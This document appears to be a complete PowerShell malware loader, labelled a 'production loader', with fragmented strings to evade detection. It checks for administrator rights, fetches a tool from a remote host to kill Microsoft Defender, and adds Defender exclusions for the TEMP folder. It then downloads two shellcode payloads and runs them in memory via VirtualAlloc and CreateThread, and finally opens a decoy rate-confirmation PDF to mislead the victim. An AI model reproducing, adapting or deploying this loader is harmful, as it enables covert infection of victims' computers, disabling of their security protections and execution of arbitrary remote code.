# stage.ps1 — XenoR2 production loader
# Dual payload: patch.exe + PatchPulsaar.exe via Amber reflective shellcode
# All strings fragmented, ASCII only, PS 5.1 compatible

$ProgressPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

# === CONFIG (fragmented) ===
$c1='ht';$c2='tps';$c3='://s';$c4='igni';$c5='ndat';$c6='.com'
$srv=$c1+$c2+$c3+$c4+$c5+$c6

# === LOGGING ===
$logPath="$env:TEMP\sys.log"
function _log($m){ $ts=Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; "$ts | $m" | Out-File $logPath -Append -Encoding utf8 }
_log "INIT: stage loaded, PID=$pid, user=$env:USERNAME"

# === ADMIN CHECK ===
$isAdmin=$false
try { $isAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch {}
_log "ADMIN: $isAdmin"

# === DOWNLOAD HELPER ===
function _dl($path) {
    $u="$srv/$path"
    try {
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        $d=$wc.DownloadData($u)
        _log "DL: $path -> $($d.Length) bytes"
        return $d
    } catch {
        _log "DL FAIL: $path -> $_"
        return $null
    }
}

# === SHELLCODE RUNNER (Amber reflective load) ===
function _run_sc($bytes, $label) {
    _log "SC: $label starting, size=$($bytes.Length)"
    try {
        $k32='kern';$k32b='el32'
        $k32dll=$k32+$k32b+'.dll'
        $va1='Virt';$va2='ualA';$va3='lloc'
        $vp1='Virt';$vp2='ualP';$vp3='rotect'
        $ct1='Creat';$ct2='eThr';$ct3='ead'
        $wf1='WaitF';$wf2='orSin';$wf3='gleOb';$wf4='ject'

        $k=Add-Type -Name 'W2' -Namespace 'Win32' -MemberDefinition @"
[DllImport("$k32dll")]
public static extern IntPtr $va1$va2$va3(IntPtr a, uint s, uint t, uint p);
[DllImport("$k32dll")]
public static extern bool $vp1$vp2$vp3(IntPtr a, uint s, uint f, out uint o);
[DllImport("$k32dll")]
public static extern IntPtr $ct1$ct2$ct3(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, out uint id);
[DllImport("$k32dll")]
public static extern uint $wf1$wf2$wf3$wf4(IntPtr h, uint ms);
"@ -PassThru

        $size=$bytes.Length
        $addr=$k::VirtualAlloc(0,$size,0x3000,0x40)
        [Runtime.InteropServices.Marshal]::Copy($bytes,0,$addr,$size)
        $o=0
        $k::VirtualProtect($addr,$size,0x20,[ref]$o)
        $tid=0
        $th=$k::CreateThread(0,0,$addr,0,0,[ref]$tid)
        _log "SC: $label launched, tid=$tid"
        $k::WaitForSingleObject($th,15000) | Out-Null
        _log "SC: $label done"
        return $true
    } catch {
        _log "SC: $label FAIL: $_"
        return $false
    }
}

# === STAGE 1: DEFENDER DISABLE (admin only) ===
if ($isAdmin) {
    _log "STAGE1: Defender disable"
    $upBytes=_dl 'update.exe'
    if ($upBytes) {
        $upPath="$env:TEMP\msupdate.exe"
        try {
            [IO.File]::WriteAllBytes($upPath,$upBytes)
            $upProc=Start-Process $upPath -ArgumentList 'kill' -Wait -NoNewWindow -PassThru
            _log "STAGE1: update.exe kill exit=$($upProc.ExitCode)"
        } catch { _log "STAGE1: update.exe FAIL: $_" }
    }

    try {
        $mp1='Add-';$mp2='MpPr';$mp3='efer';$mp4='ence'
        $mpCmd=$mp1+$mp2+$mp3+$mp4
        & $mpCmd -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
        & $mpCmd -ExclusionProcess "$env:TEMP\msupdate.exe" -ErrorAction SilentlyContinue
        _log "STAGE1: exclusions added"
    } catch { _log "STAGE1: exclusions FAIL: $_" }
    Start-Sleep 2
}

# === STAGE 2: patch.exe (Amber shellcode) ===
_log "STAGE2: patch.exe"
$patchSc=_dl 'patch_amber_sgn.bin'
if ($patchSc) {
    _run_sc $patchSc 'patch.exe'
    Start-Sleep 3
} else {
    _log "STAGE2: download FAIL"
}

# === STAGE 3: PatchPulsaar.exe (Amber shellcode) ===
_log "STAGE3: PatchPulsaar.exe"
$pulsaarSc=_dl 'PatchPulsaar_amber_sgn.bin'
if ($pulsaarSc) {
    _run_sc $pulsaarSc 'PatchPulsaar.exe'
    Start-Sleep 2
} else {
    _log "STAGE3: download FAIL"
}

# === STAGE 4: PDF DECOY ===
_log "STAGE4: PDF decoy"
$pdfBytes=_dl 'Rate_Confirmation_LD-2026-0847.pdf'
if ($pdfBytes) {
    try {
        $pdf1='Rate';$pdf2='_Confirmation';$pdf3='_LD-2026-0847';$pdf4='.pdf'
        $pdfName=$pdf1+$pdf2+$pdf3+$pdf4
        $pdfPath="$env:USERPROFILE\Downloads\$pdfName"
        [IO.File]::WriteAllBytes($pdfPath,$pdfBytes)
        Start-Process $pdfPath
        _log "STAGE4: PDF opened"
    } catch { _log "STAGE4: PDF FAIL: $_" }
}

_log "DONE: stage complete"
